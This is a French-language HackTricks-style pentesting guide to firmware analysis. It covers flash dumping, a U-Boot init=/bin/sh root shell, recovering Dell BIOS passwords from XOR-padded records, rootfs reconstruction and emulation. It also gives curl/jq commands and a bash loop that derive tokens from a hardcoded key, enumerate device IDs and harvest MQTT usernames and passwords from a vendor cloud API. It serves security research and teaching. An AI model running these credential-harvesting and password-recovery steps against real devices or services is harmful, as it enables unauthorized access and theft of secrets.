# Analyse du firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduction**

### Ressources connexes

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Le firmware est un logiciel essentiel qui permet aux appareils de fonctionner correctement en gérant et en facilitant la communication entre les composants matériels et les logiciels avec lesquels les utilisateurs interagissent. Il est stocké dans une mémoire permanente, ce qui garantit que l’appareil peut accéder aux instructions vitales dès sa mise sous tension et lancer ainsi le système d’exploitation. L’examen et la modification éventuelle du firmware constituent une étape cruciale pour identifier les vulnérabilités de sécurité.<sup>[[2]](#references)[[3]](#references)</sup>

## **Collecte d’informations**

La **collecte d’informations** est une première étape cruciale pour comprendre la composition d’un appareil et les technologies qu’il utilise. Ce processus consiste à recueillir des données sur :

- L’architecture du CPU et le système d’exploitation qu’il exécute
- Les spécificités du bootloader
- La configuration matérielle et les fiches techniques
- Les métriques de la base de code et les emplacements du code source
- Les bibliothèques externes et les types de licences
- L’historique des mises à jour et les certifications réglementaires
- Les diagrammes d’architecture et de flux
- Les évaluations de sécurité et les vulnérabilités identifiées

À cette fin, les outils d’**open-source intelligence (OSINT)** sont très utiles, tout comme l’analyse des composants logiciels open source disponibles, par des processus de revue manuelle et automatisée. Des outils comme [Coverity Scan](https://scan.coverity.com) et [Semmle’s LGTM](https://lgtm.com/#explore) proposent une analyse statique gratuite qui peut aider à détecter des problèmes potentiels.

## **Acquisition du firmware**

Le firmware peut être obtenu de différentes façons, chacune présentant un niveau de complexité qui lui est propre :

- L’obtenir **directement** auprès de la source (développeurs, fabricants)
- Le **compiler** à partir des instructions fournies
- Le **télécharger** depuis les sites d’assistance officiels
- Utiliser des requêtes **Google dork** pour trouver des fichiers de firmware hébergés
- Accéder directement au **cloud storage**, avec des outils comme [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercepter les **mises à jour** à l’aide de techniques man-in-the-middle
- L’**extraire** de l’appareil via des connexions comme **UART**, **JTAG** ou **PICit**
- **Sniffer** les requêtes de mise à jour dans les communications de l’appareil
- Identifier et utiliser des **endpoints de mise à jour codés en dur**
- En faire un **dump** depuis le bootloader ou le réseau
- **Retirer et lire** la puce de stockage, en dernier recours, à l’aide du matériel approprié

### Journaux UART uniquement : forcer un shell root via l’environnement U-Boot en flash

Si les données reçues par UART sont ignorées (journaux uniquement), vous pouvez tout de même forcer un shell init en **modifiant hors ligne le blob de l’environnement U-Boot** :<sup>[[6]](#references)</sup>

1. Faire un dump de la SPI flash avec une pince SOIC-8 et un programmateur (3,3 V) :
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localisez la partition env de U-Boot, modifiez `bootargs` pour inclure `init=/bin/sh`, et **recalculez le CRC32 de l’env U-Boot** pour le blob.
3. Reflashez uniquement la partition env et redémarrez ; un shell devrait apparaître sur UART.

Cette méthode est utile sur les appareils embarqués dont le shell du bootloader est désactivé, mais dont la partition env est accessible en écriture via un accès externe à la flash.

## Analyse du micrologiciel

Maintenant que vous **avez le micrologiciel**, vous devez en extraire des informations pour savoir comment le traiter. Voici différents outils que vous pouvez utiliser :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si vous ne trouvez pas grand-chose avec ces outils, vérifiez l’**entropie** de l’image avec `binwalk -E <bin>` : si elle est faible, l’image n’est probablement pas chiffrée. Si elle est élevée, elle est probablement chiffrée (ou compressée d’une manière ou d’une autre).

Vous pouvez également utiliser ces outils pour extraire les **fichiers intégrés au firmware** :

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Vous pouvez aussi utiliser [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pour examiner le fichier.

### Analyse différentielle de la flash et stockages secrets XOR récupérables

Lorsqu’un paramètre du firmware n’a pas de format de stockage documenté, commencez par effectuer plusieurs lectures identiques de la flash, modifiez **un seul** paramètre, puis dumpez à nouveau la puce entière et comparez les offsets. Répéter l’expérience avec des valeurs contrôlées permet de distinguer le paramètre des compteurs et des métadonnées d’écriture ; des changements à de nouveaux offsets plutôt qu’en place indiquent un stockage en ajout seul ou structuré en journal. Conservez les entrées supprimées ou marquées comme supprimées, car leurs octets de données peuvent rester récupérables.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Après avoir localisé la région, extrayez les modules du firmware à l’aide d’outils tels que `binwalk`, puis analysez dans Ghidra les routines d’écriture et de validation. Confirmez dans le code les limites des champs, le bourrage, l’indexation des clés et la dérivation de clé, au lieu de déduire le schéma uniquement à partir des motifs du texte chiffré.<sup>[[12]](#references)</sup>

#### Récupérer des clés à partir du bourrage chiffré composé de zéros

Comme décrit dans [le chiffrement basé sur XOR](../../crypto/symmetric/#xor-based-encryption), un texte en clair connu révèle des octets de flot de clé aux mêmes positions. Un champ de taille fixe est particulièrement vulnérable lorsque son bourrage composé de zéros couvre tous les indices d’une clé XOR répétée : le bourrage chiffré révèle directement ces octets de clé, car `0x00 XOR key_byte = key_byte`. Si tous les indices de la clé sont couverts, reconstituez la clé à partir de la fin du texte chiffré, puis déchiffrez les octets renseignés.<sup>[[12]](#references)</sup>

Le format DVAR de mot de passe BIOS vulnérable de Dell en est un exemple concret : l’octet `0` d’un champ de 32 octets est en clair, tandis que les octets `1..31` utilisent une clé répétée de 20 octets.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Pour une longueur de mot de passe `L`, les positions `L..31` étaient à zéro avant le XOR. Lorsque `L <= 12`, ces positions couvrent tous les index de la clé, ce qui permet de récupérer la clé complète et le mot de passe sans brute force :<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Extraire des clés à partir d’enregistrements historiques

N’analysez pas chaque enregistrement indépendamment. La clé DVAR est dérivée approximativement comme `modified_md5(device_seed || variable_GUID || password[0])` : la graine de l’appareil et le GUID sont fixes, et le seul élément dépendant du mot de passe est son premier octet en clair. Cela donne au plus 256 clés par appareil, et les enregistrements commençant par le même octet partagent une clé. Regroupez les enregistrements actifs et supprimés selon cet octet ; un court enregistrement historique peut révéler la clé complète grâce au padding et permettre de déchiffrer un enregistrement actuel plus long dont le padding ne suffit pas. La rotation du mot de passe peut donc accroître l’exposition lorsque l’ancien texte chiffré est tombstoned plutôt qu’effacé.<sup>[[12]](#references)</sup>

L’outil [`dellpwn`](https://github.com/R3n5k1/dellpwn) localise les DVAR, valide les enregistrements candidats, récupère les mots de passe et peut afficher les octets bruts stockés et ceux des clés. Compilez-le à partir d’un checkout et analysez une image flash vérifiée comme suit :<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Pour les parseurs personnalisés, rejetez les faux positifs à l’aide de la structure des enregistrements, de contraintes sur les caractères imprimables, de vérifications du remplissage par des zéros, de l’entropie des clés et de la cohérence lorsque la clé reboucle. Si des dumps répétés montrent des inversions de bits éparses à chaque écriture, énumérez les masques observés et classez les corrections selon ces contraintes, mais signalez les caractères ambigus au lieu de présenter un résultat heuristique comme une récupération exacte.<sup>[[12]](#references)</sup>

Les vérificateurs de mots de passe doivent stocker un hash à sens unique salé et itéré plutôt qu’un texte chiffré réversible, et les stockages structurés en journal doivent supprimer de manière sécurisée les données secrètes remplacées.<sup>[[12]](#references)</sup>

### Récupération du système de fichiers

Avec les outils commentés précédemment, comme `binwalk -ev <bin>`, vous devriez avoir pu **extraire le système de fichiers**.\
Binwalk l’extrait généralement dans un **dossier nommé d’après le type de système de fichiers**, qui est généralement l’un des suivants : squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extraction manuelle du système de fichiers

Parfois, binwalk **ne reconnaît pas la signature du système de fichiers**. Dans ce cas, utilisez binwalk pour **trouver le décalage du système de fichiers et extraire le système de fichiers compressé** du binaire, puis **extrayez manuellement** le système de fichiers selon son type en suivant les étapes ci-dessous.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Exécutez la **commande dd** suivante pour extraire le système de fichiers Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativement, la commande suivante peut également être exécutée.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Pour squashfs (utilisé dans l’exemple ci-dessus)

`$ unsquashfs dir.squashfs`

Les fichiers se trouveront ensuite dans le répertoire "`squashfs-root`".

- Fichiers d’archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Pour les systèmes de fichiers jffs2

`$ jefferson rootfsfile.jffs2`

- Pour les systèmes de fichiers ubifs avec mémoire flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Reconstruire des systèmes de fichiers racine embarqués et segmentés

Si un dump brut d’eMMC/SSD contient un en-tête de système de fichiers valide, mais que ses décalages de métadonnées dépassent la taille nominale de la partition, ne le classez pas immédiatement comme corrompu. Le code d’amorçage embarqué peut assembler le périphérique racine réel à partir de plusieurs plages physiques à l’aide de Device Mapper ; ainsi, l’extraction d’une seule partition GPT ne produit que le premier segment.<sup>[[9]](#references)</sup>

#### Examiner l’image complète du support

Vérifiez d’abord que l’acquisition est terminée, que la taille est stable et qu’aucun processus d’écriture n’utilise encore l’image. Si le nom du fichier encode une adresse de début et de fin, comparez cette plage au nombre réel d’octets. Récupérez la GPT en mode lecture seule et n’attachez que la plage nécessaire ; **ne** lancez **pas** `vgchange -ay` sur un volume physique non fiable depuis la station de travail, car des collisions de groupes de volumes et des écritures involontaires sont possibles.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Préférez une VM jetable lorsque la logique d'init d'origine ou une pile LVM doit accéder à l'image entière. Les journaux de démarrage historiques d'une partition de démarrage standard sont particulièrement utiles : le bootloader peut avoir consigné les décalages des conteneurs propriétaires, les longueurs des composants, la sélection du slot, les règles d'alignement et la vérification de signature. Utilisez ces valeurs pour extraire une ligne de commande, un kernel et un initramfs intégrés, puis validez chaque sortie séparément avec `file`, les octets magiques et `binwalk` ; lire jusqu'à la fin du conteneur peut accidentellement ajouter un initrd, un objet ACPI ou une signature au kernel.<sup>[[9]](#references)</sup>

#### Récupérer la cartographie des blocs au démarrage

Extrayez l'initramfs du kernel et rétro-ingénieriez son `/init` ainsi que toutes les bibliothèques de stockage. Dans [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), suivez les références de chaînes pour `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` et les chemins de partition ; remontez ensuite le code qui sélectionne le slot A/B actif et construit la table. Pour démarrer avec radare2, utilisez `r2 -A init`, `afl`, `pdf @ main` et `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

La cible linear mappe des plages consécutives d'un périphérique virtuel sur des plages d'un ou plusieurs périphériques sous-jacents. Une table récupérée à deux segments a souvent cette forme (toutes les positions et longueurs sont en secteurs de 512 octets) :<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduisez exactement l’arithmétique du code machine, notamment la largeur des entiers, les décalages et les conversions d’unités. Par exemple, l’expression suivante arrondit une taille en octets à la limite inférieure de 4 Kio, puis la convertit seulement ensuite en secteurs de 512 octets ; la remplacer par `p4_bytes // 512` décale la fin sélectionnée de `p4_bytes % 4096` lorsque la partition n’est pas alignée sur une page.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Reconstruisez une image d’analyse à plat en copiant les plages dans l’ordre du tableau, par blocs de taille limitée, plutôt que de charger l’intégralité du dump du média en mémoire. Cela évite également de créer des périphériques mapper côté hôte. Gardez les offsets dérivés de GPT, les nombres de secteurs inversés et la longueur de sortie obtenue sous forme d’assertions distinctes.<sup>[[9]](#references)</sup>

#### Distinguer la corruption d’une erreur de reconstruction constante

Pour SquashFS, vérifiez la magic `hsqs` et décodez le champ little-endian de 64 bits `bytes_used` à l’offset 40 du superbloc avant d’exécuter `unsquashfs`. Si l’extraction échoue dans plusieurs structures sans rapport entre elles, recherchez dans une large fenêtre autour des positions attendues et exigez des candidats structurels solides : un bloc de métadonnées décompressible, plusieurs entrées de répertoire valides consécutives, des champs d’inode plausibles, un inode racine cohérent avec le nombre d’inodes ou une structure de métadonnées d’intégrité valide. Une seule correspondance de magic ne suffit pas.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Lorsque le même delta signé rend valides des structures indépendantes — par exemple les métadonnées d’un répertoire et un enregistrement verity — la cause probable est une erreur systématique de début de segment plutôt que des octets manquants. Revenez aux calculs inversés et recherchez les restes écartés, les problèmes de signedness, les dépassements ou les arrondis aux secteurs/pages avant de tenter une récupération de fichiers orphelins ou de modifier les métadonnées du système de fichiers.<sup>[[9]](#references)</sup>

Enfin, gardez les limites de protection distinctes : les volumes LUKS scellés par TPM protègent la confidentialité des données, tandis qu’un mapping dm-verity signé protège l’intégrité du système de fichiers racine. Un TPM logiciel ne permet pas de récupérer une clé scellée sur le TPM physique d’origine, et démarrer un SquashFS modifié avec un init réservé à la recherche qui omet la vérification verity ne falsifie pas sa signature et ne compromet pas dm-verity.<sup>[[9]](#references)</sup>

## Analyse du firmware

Une fois le firmware obtenu, il est essentiel de le disséquer pour comprendre sa structure et ses vulnérabilités potentielles. Ce processus consiste à utiliser divers outils pour analyser et extraire des données utiles de l’image du firmware.

### Outils d’analyse initiale

Un ensemble de commandes est fourni pour inspecter initialement le fichier binaire (désigné par `<bin>`). Ces commandes aident à identifier les types de fichiers, à extraire des chaînes, à analyser les données binaires et à comprendre les détails des partitions et des systèmes de fichiers :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Pour évaluer l’état du chiffrement de l’image, on vérifie l’**entropie** avec `binwalk -E <bin>`. Une entropie faible suggère une absence de chiffrement, tandis qu’une entropie élevée indique un possible chiffrement ou une compression.

Pour extraire les **fichiers intégrés**, il est recommandé d’utiliser des outils et des ressources comme la documentation **file-data-carving-recovery-tools** et **binvis.io** pour l’inspection des fichiers.

### Extraction du système de fichiers

Avec `binwalk -ev <bin>`, on peut généralement extraire le système de fichiers, souvent dans un répertoire nommé d’après son type (par ex. squashfs, ubifs). Toutefois, lorsque **binwalk** ne parvient pas à reconnaître le type de système de fichiers en raison de magic bytes manquants, une extraction manuelle est nécessaire. Il faut alors utiliser `binwalk` pour localiser l’offset du système de fichiers, puis la commande `dd` pour en extraire les données :

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Ensuite, selon le type de système de fichiers (p. ex. squashfs, cpio, jffs2, ubifs), différentes commandes sont utilisées pour extraire manuellement le contenu.

### Analyse du système de fichiers

Une fois le système de fichiers extrait, la recherche de failles de sécurité commence. L’attention se porte sur les services réseau non sécurisés, les identifiants codés en dur, les endpoints d’API, les fonctionnalités des serveurs de mise à jour, le code non compilé, les scripts de démarrage et les binaires compilés à analyser hors ligne.

**Emplacements clés** et **éléments** à inspecter :

- **etc/shadow** et **etc/passwd** pour les identifiants des utilisateurs
- Les certificats et clés SSL dans **etc/ssl**
- Les fichiers de configuration et de script pouvant présenter des vulnérabilités
- Les binaires intégrés à analyser plus en détail
- Les serveurs web et binaires courants des appareils IoT

Plusieurs outils permettent de repérer des informations sensibles et des vulnérabilités dans le système de fichiers :

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) et [**Firmwalker**](https://github.com/craigz28/firmwalker) pour rechercher des informations sensibles
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) pour une analyse complète du firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) et [**EMBA**](https://github.com/e-m-b-a/emba) pour l’analyse statique et dynamique

### Contrôles de sécurité des binaires compilés

Le code source et les binaires compilés trouvés dans le système de fichiers doivent être examinés pour détecter les vulnérabilités. Des outils comme **checksec.sh** pour les binaires Unix et **PESecurity** pour les binaires Windows permettent d’identifier les binaires insuffisamment protégés qui pourraient être exploités.

## Récupération de la configuration cloud et des identifiants MQTT via des tokens d’URL dérivés

De nombreux hubs IoT récupèrent leur configuration propre à chaque appareil depuis un endpoint cloud qui ressemble à ceci :<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Lors de l’analyse du firmware, vous pouvez découvrir que le `<token>` est dérivé localement de l’identifiant de l’appareil à l’aide d’un secret codé en dur, par exemple :

- token = MD5( deviceId || STATIC_KEY ) et représenté en hexadécimal majuscule

Cette conception permet à toute personne connaissant un deviceId et le STATIC_KEY de reconstruire l’URL et de récupérer la configuration cloud, qui révèle souvent des identifiants MQTT en texte clair et des préfixes de topic.

Procédure pratique :

1) Extraire le deviceId des journaux de démarrage UART

- Connectez un adaptateur UART 3,3 V (TX/RX/GND) et capturez les journaux :

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Recherchez les lignes qui affichent le modèle d’URL de configuration cloud et l’adresse du broker, par exemple :

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Récupérer STATIC_KEY et l’algorithme du token à partir du firmware

- Charger les binaires dans Ghidra/radare2 et rechercher le chemin de configuration ("/pf/") ou l’utilisation de MD5.
- Confirmer l’algorithme (p. ex. MD5(deviceId||STATIC_KEY)).
- Générer le token dans Bash et mettre le digest en majuscules :

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Récolter la configuration cloud et les identifiants MQTT

- Composez l’URL et récupérez le JSON avec curl ; analysez-le avec jq pour extraire les secrets :

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Exploiter MQTT en clair et des ACL de topic faibles (si elles existent)

- Utilisez les identifiants récupérés pour vous abonner aux topics de maintenance et rechercher des événements sensibles :

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Énumérer des identifiants d’appareil prévisibles (à grande échelle, avec autorisation)

- De nombreux écosystèmes intègrent des octets OUI/produit/type du fournisseur, suivis d’un suffixe séquentiel.
- Vous pouvez parcourir les identifiants candidats, dériver des tokens et récupérer des configurations de manière programmatique :

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Remarques
- Obtenez toujours une autorisation explicite avant de tenter une énumération à grande échelle.
- Privilégiez l’émulation ou l’analyse statique pour récupérer des secrets sans modifier le matériel cible, lorsque c’est possible.

L’émulation du firmware permet d’effectuer une **analyse dynamique** du fonctionnement d’un appareil ou d’un programme individuel. Cette approche peut se heurter à des dépendances matérielles ou liées à l’architecture, mais le transfert du système de fichiers racine ou de binaires spécifiques vers un appareil doté de la même architecture et du même boutisme, comme un Raspberry Pi, ou vers une machine virtuelle préconfigurée, peut faciliter les tests.

### Émulation de binaires individuels

Pour examiner des programmes isolés, il est essentiel d’identifier leur boutisme et l’architecture de leur processeur.

#### Exemple avec l’architecture MIPS

Pour émuler un binaire d’architecture MIPS, vous pouvez utiliser la commande suivante :

```bash
file ./squashfs-root/bin/busybox
```

Et pour installer les outils d’émulation nécessaires :

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Pour MIPS (big-endian), on utilise `qemu-mips`, et pour les binaires little-endian, `qemu-mipsel` est le choix approprié.

#### Émulation de l’architecture ARM

Pour les binaires ARM, le processus est similaire : l’émulateur `qemu-arm` est utilisé.

### Émulation complète du système

Des outils comme [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) et d’autres facilitent l’émulation complète du firmware, en automatisant le processus et en facilitant l’analyse dynamique.

### Reconstruire des systèmes de fichiers racine scindés et vérifiés pour l’émulation

Si un superbloc SquashFS est lisible, mais que les offsets des inodes, des répertoires ou de la table des fragments sont impossibles, ne corrigez pas immédiatement `unsquashfs`. Analysez le binaire de démarrage précoce et reproduisez le graphe des périphériques bloc qu’il crée : les systèmes embarqués peuvent exposer une partition racine nominale, mais construire le véritable système de fichiers à l’aide d’un mappage `dm-linear` qui ajoute des secteurs empruntés à une autre partition. Les vérifications du seul superbloc peuvent réussir alors que tous les blocs de métadonnées suivants sont décalés.<sup>[[11]](#references)</sup>

Respectez exactement l’arithmétique du firmware. Identifiez notamment si les longueurs sont exprimées en octets, en secteurs de 512 octets ou en pages de 4 Kio ; reproduisez les décalages binaires et les troncatures dans leur ordre d’origine ; et tenez compte des régions de fin dépendantes de la banque dans les configurations A/B. Par exemple, `(partition_bytes >> 12) << 3` tronque d’abord à une limite de 4 Kio, puis exprime le résultat en secteurs de 512 octets ; le remplacer par `partition_bytes // 512` peut décaler l’étendue ajoutée de quelques kilo-octets et corrompre toutes les tables SquashFS en aval.<sup>[[11]](#references)</sup>

Voici une procédure de validation utile :<sup>[[11]](#references)</sup>

1. Récupérez le périphérique source, le secteur de départ et la longueur de chaque segment `dm-linear` à partir du binaire du vérificateur ou d’init.
2. Concaténez ou mappez les étendues sans modifier leur sémantique d’alignement.
3. Si l’extraction échoue toujours, recherchez uniquement dans une petite fenêtre autour de la limite prédite et exigez plusieurs structures de métadonnées valides consécutives, au lieu de vous fier à un superbloc simplement plausible.
4. Exécutez un `unsquashfs` non modifié sur l’image reconstruite ; le parcours réussi de tous les répertoires et fragments constitue une preuve plus solide que `unsquashfs -stat`.

#### Remplacement de dm-verity contrôlé par l’analyste

Lorsque l’analyste contrôle le noyau QEMU, l’initramfs et les disques virtuels, il est possible de démarrer un système racine modifié en remplaçant le PID 1 de vérification du fournisseur par un petit init lié statiquement. Il s’agit d’une **substitution de la chaîne de démarrage en laboratoire**, et non d’une rupture de dm-verity, de sa signature RSA, de Secure Boot ou d’une clé scellée par TPM.<sup>[[11]](#references)</sup>

L’init de remplacement doit reproduire les étapes opérationnelles du chemin de démarrage d’origine : monter `devtmpfs`, appeler `setsid()`, connecter `/dev/console` aux descripteurs de fichiers 0–2, monter `/proc` et `/sys`, attendre le périphérique bloc fourni, monter en lecture seule le système racine modifié, détacher les pseudo-systèmes de fichiers de l’ancien système racine, déplacer le nouveau montage sur `/`, appeler `chroot`, puis exécuter avec `execve()` le `/sbin/init` d’origine du firmware. Détacher `/dev`, `/proc` et `/sys` **avant** `MS_MOVE` évite de détacher accidentellement des points de montage appartenant au nouveau système racine.<sup>[[11]](#references)</sup>

Conservez l’état mutable du périphérique séparément du système racine immuable modifié. Un overlay qcow2 peut préserver l’état LVM du disque d’origine, tandis qu’un second disque virtio en lecture seule fournit le SquashFS modifié :<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Débogage de l’état de l’image hors ligne

Inspectez l’état persistant depuis l’extérieur de l’invité lorsque les démarrages lents, les scripts de démarrage destructeurs ou les journaux de console peu fiables masquent la défaillance. N’attachez jamais un overlay utilisé par une VM en cours d’exécution ; exposez-le avec `qemu-nbd`, limitez la détection LVM à la partition NBD prévue et désactivez le groupe de volumes avant de le déconnecter.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Pour isoler les pannes de façon reproductible, écrivez des fichiers marqueurs horodatés sur un volume inscriptible stable et vérifiez-les hors ligne ; `/dev/kmsg`, les FIFO et les consoles éphémères peuvent produire des faux négatifs en raison de la limitation du débit ou de l’arrêt prématuré des processus. Comparez également les interfaces exactes entre les couches avant de modifier du code sans rapport : `uname -r` par rapport à `/lib/modules/`, les fonctionnalités ext4 sur disque par rapport à la configuration du kernel, et la génération de `libGL` de Mesa par rapport à l’ABI du pilote DRI et aux noms de pilotes dérivés du PCI. Un composant peut être présent et même se charger avec `dlopen()` tout en restant inutilisable parce que son consommateur attend une ABI différente.<sup>[[11]](#references)</sup>

## Analyse dynamique en pratique

À ce stade, un environnement d’appareil réel ou émulé est utilisé pour l’analyse. Il est essentiel de conserver un accès shell au système d’exploitation et au système de fichiers. L’émulation peut ne pas reproduire parfaitement les interactions matérielles, ce qui nécessite parfois de la redémarrer. L’analyse doit examiner de nouveau le système de fichiers, exploiter les pages web et les services réseau exposés, et explorer les vulnérabilités du bootloader. Les tests d’intégrité du firmware sont essentiels pour repérer d’éventuelles vulnérabilités de type backdoor.

## Techniques d’analyse à l’exécution

L’analyse à l’exécution consiste à interagir avec un processus ou un binaire dans son environnement d’exécution, à l’aide d’outils tels que gdb-multiarch, Frida et Ghidra pour poser des points d’arrêt et repérer des vulnérabilités par fuzzing et d’autres techniques.

Pour les cibles embarquées sans débogueur complet, **copiez un `gdbserver` lié statiquement** sur l’appareil et connectez-vous à distance :<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mappage des messages Zigbee / radio-co-processor

Sur les hubs IoT, la pile RF est souvent répartie entre un **MCU radio** et un processus Linux en espace utilisateur. Une méthode utile consiste à cartographier le chemin :<sup>[[8]](#references)</sup>

1. **Trame RF** transmise par radio
2. **Analyseur côté contrôleur** sur le MCU radio
3. **Protocole texte ou TLV sur série/UART** transféré vers Linux (par exemple `/dev/tty*`)
4. **Dispatcher de l’application** dans le daemon principal
5. **Gestionnaire / machine à états spécifique au protocole**

Cette architecture fournit deux cibles de rétro-ingénierie au lieu d’une. Si le contrôleur convertit les trames radio binaires en un protocole textuel tel que `Group,Command,arg1,arg2,...`, identifiez :

- Les **groupes de messages** et les tables de dispatch
- Les messages pouvant provenir du **réseau** ou du contrôleur lui-même
- Les **champs discriminateurs spécifiques au fabricant** exacts (par exemple Zigbee `manufacturer_code` et `cluster_command` personnalisé)
- Les gestionnaires accessibles uniquement pendant les phases d’**appairage**, de découverte ou de téléchargement du firmware/modèle

